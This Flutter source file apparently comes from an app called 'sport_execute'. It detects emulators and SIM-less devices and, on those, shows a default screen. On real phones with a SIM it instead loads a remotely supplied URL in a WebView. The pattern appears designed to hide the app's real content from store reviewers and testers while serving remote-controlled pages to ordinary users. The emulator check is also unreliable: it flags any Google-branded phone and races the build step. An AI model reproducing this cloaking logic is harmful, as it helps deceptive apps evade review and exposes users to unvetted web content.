import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter_sim_country_code/flutter_sim_country_code.dart';
import 'package:sport_execute/screens/web_page.dart';

import '../bloc/FireCubit.dart';
import '../bloc/FireState.dart';
import 'default/default_screen.dart';
import 'exception_screen.dart';
import 'loading_screen.dart';

class MyHomePage extends StatefulWidget {
  const MyHomePage({super.key});

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  var checkSimCard = false;
  var checkEmu = false;
 

  @override
  initState(){
    super.initState();
    checkValue();
  }

  checkValue()async{
     checkSimCard = await platform();
     checkEmu = await checkIsEmu();
  }


  Future<bool> platform() async {
    String platformVersion;
    try {
      platformVersion = (await FlutterSimCountryCode.simCountryCode)!;
    } on PlatformException {
      platformVersion = 'Failed';
    }

    return platformVersion.length != 2;
  }

  checkIsEmu() async {
    final devInfo = DeviceInfoPlugin();
    final em = await devInfo.androidInfo;

    var phoneModel = em.model;
    var buildProduct = em.product;
    var buildHardware = em.hardware;

    var result = (em.fingerprint.startsWith("generic") ||
        phoneModel.contains("google_sdk") ||
        phoneModel.contains("droid4x") ||
        phoneModel.contains("Emulator") ||
        phoneModel.contains("Android SDK built for x86") ||
        em.manufacturer.contains("Genymotion") ||
        buildHardware == "goldfish" ||
        buildHardware == "vbox86" ||
        buildProduct == "sdk" ||
        buildProduct == "google_sdk" ||
        buildProduct == "sdk_x86" ||
        buildProduct == "vbox86p" ||
        em.brand.contains('google') ||
        em.board.toLowerCase().contains("nox") ||
        em.bootloader.toLowerCase().contains("nox") ||
        buildHardware.toLowerCase().contains("nox") ||
        !em.isPhysicalDevice ||
        buildProduct.toLowerCase().contains("nox"));

    if (result) return true;
    result = result ||
        (em.brand.startsWith("generic") && em.device.startsWith("generic"));
    if (result) return true;
    result = result || ("google_sdk" == buildProduct);
    return result;
  }




  @override
  Widget build(BuildContext context) {
    return BlocBuilder<FireCubit, FireStringState>(builder: (context, state) {
      if (state is LoadingFireString) {
        return LoadingScreen();
      } else if (state is FireStringSuccess) {
        return state.fireString == '' || checkSimCard || checkEmu
        ? const DefaultScreen() 
        : WebVeiwPage(webPage: state.fireString);
      } else if (state is FireStringFailure) {
        return ExceptionView(state.exception);
      } else {
        return LoadingScreen();
      }
    });
  }
}
